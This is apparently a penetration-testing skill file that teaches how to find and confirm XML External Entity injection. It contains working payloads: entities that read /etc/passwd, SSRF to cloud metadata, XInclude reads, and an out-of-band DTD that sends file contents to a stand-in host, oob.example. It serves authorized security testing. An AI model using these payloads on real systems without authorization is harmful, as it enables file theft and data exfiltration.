---
name: xxe-testing
description: Test applications for XML External Entity injection — where an XML parser processes attacker-controlled input with external entities enabled, yielding file disclosure, SSRF, blind OOB exfiltration, or DoS. OWASP A05:2025 Injection. Use wherever the app parses XML, SVG, SOAP, DOCX/XLSX/OOXML, SAML, RSS, or any XML-backed upload or API.
---

# XXE Testing

XXE occurs when an XML parser resolves external entities defined in attacker-controlled XML. The golden rule: **it needs two things — the server parses XML, and external entities are not disabled.** Impact ranges from local file disclosure and SSRF to blind OOB exfiltration and, on some parsers, RCE. Part of OWASP A05:2025 (Injection).

## Find where XML is parsed

- Explicit XML/SOAP APIs, REST endpoints accepting `Content-Type: application/xml` or `text/xml` (try switching a JSON endpoint to XML).
- File uploads that are really XML under the hood: **SVG**, **DOCX/XLSX/PPTX** (OOXML zip), RSS/Atom, GPX, SAML responses, XML sitemaps, config imports.
- Anywhere a parameter value is later embedded into an XML document server-side.

## Core tests

1. **Classic file disclosure** (in-band) — define an external entity and reference it where output is reflected:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <root><name>&xxe;</name></root>
   ```
   If `/etc/passwd` content appears in the response → XXE confirmed. (Windows: `file:///c:/windows/win.ini`.)
2. **SSRF via XXE** — point the entity at an internal URL or cloud metadata: `SYSTEM "http://169.254.169.254/latest/meta-data/"` (see [[ssrf-testing]] for targets/encodings).
3. **Blind / OOB XXE** (no reflection) — the common real-world case. Host an external DTD on your server and use parameter entities to trigger a callback:
   - In-payload: `<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://oob.example/x"> %ext; ]>`
   - **OOB data exfiltration**: external DTD builds a URL containing file contents and forces a fetch to your listener:
     ```
     <!ENTITY % file SYSTEM "file:///etc/hostname">
     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://oob.example/?d=%file;'>">
     %eval; %exfil;
     ```
   - A DNS/HTTP hit on your interactsh/Collaborator listener confirms parsing; the query string carries the exfiltrated data. Use FTP or error-based DTDs for multi-line files.
4. **Error-based** — trigger a parser error that embeds file contents in the error message when OOB egress is blocked.
5. **Billion-laughs / entity expansion (DoS)** — test cautiously and only with permission; note it rather than actually degrading a production service.

## Bypasses & variants

- If the DTD is filtered, try **parameter entities** (`%`) which some filters miss.
- **XInclude** when you can't control the full document (inject into a value that's placed inside server-generated XML): `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>`.
- **SVG upload** carrying an XXE payload rendered/converted server-side.
- **OOXML**: unzip a DOCX/XLSX, inject the entity into an XML part, re-zip, upload.
- Encoding wrappers (`php://filter` on PHP targets) to read source or binary files as base64.

## Validation — avoid false positives

- In-band: confirm real file content (recognizable `/etc/passwd` lines), not an error string that merely mentions the path.
- Blind: require an actual received OOB callback on your listener; a slow response is not proof.
- Confirm it's the *server's* parser resolving the entity, not your own client tooling echoing it back.

## Severity guidance

- **Critical**: file disclosure of sensitive files/secrets, SSRF to cloud metadata, or RCE via an exploitable parser.
- **High**: confirmed blind OOB XXE with data exfiltration.
- **Medium**: entity resolution proven (OOB callback) but no sensitive data reached yet; DoS potential.

## References

- OWASP Top 10 2025 — A05 Injection
- OWASP WSTG v4.2 — 4.7.7 Testing for XML Injection / XXE
- Recent parser CVEs (e.g., Apache Tika CVE-2025-66516) — check component versions
